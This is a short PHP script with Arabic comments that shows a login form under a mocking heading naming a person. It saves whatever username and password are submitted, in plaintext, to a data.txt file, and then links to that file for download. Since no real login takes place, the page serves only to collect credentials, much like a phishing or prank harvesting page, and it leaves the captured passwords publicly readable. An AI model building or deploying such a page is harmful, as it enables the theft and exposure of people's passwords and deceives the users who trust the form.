<?php
// تحقق إذا تم إرسال البيانات عبر POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استلام البيانات المدخلة من المستخدم
    $username = $_POST['username'];
    $password = $_POST['password'];

    // تنسيق البيانات لتخزينها في الملف
    $data = "اسم المستخدم: $username\nكلمة المرور: $password\n\n";

    // تحديد المسار حيث سيتم حفظ البيانات
    $file = "data.txt";

    // فتح الملف أو إنشاءه إذا لم يكن موجودًا، ثم إضافة البيانات
    file_put_contents($file, $data, FILE_APPEND);

    // إظهار رسالة تأكيد للمستخدم بعد حفظ البيانات
    echo "<h1>تم حفظ البيانات بنجاح!</h1>";
    echo "<p>يمكنك الآن <a href='$file' download>تحميل الملف</a> أو <a href=''>العودة</a>.</p>";
} else {
    // إذا لم يتم إرسال بيانات عبر POST، عرض نموذج تسجيل الدخول
    echo '
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>نموذج تسجيل الدخول</title>
    </head>
    <body>
    
        <h1>أعطاي نياسين الياس عمر طه 😏👊😂😂</h1>
        
        <form action="" method="POST">
            <label for="username">اسم المستخدم:</label><br>
            <input type="text" id="username" name="username" required><br><br>
            
            <label for="password">كلمة المرور:</label><br>
            <input type="password" id="password" name="password" required><br><br>
            
            <button type="submit">تسجيل الدخول</button>
        </form>

    </body>
    </html>';
}
?>
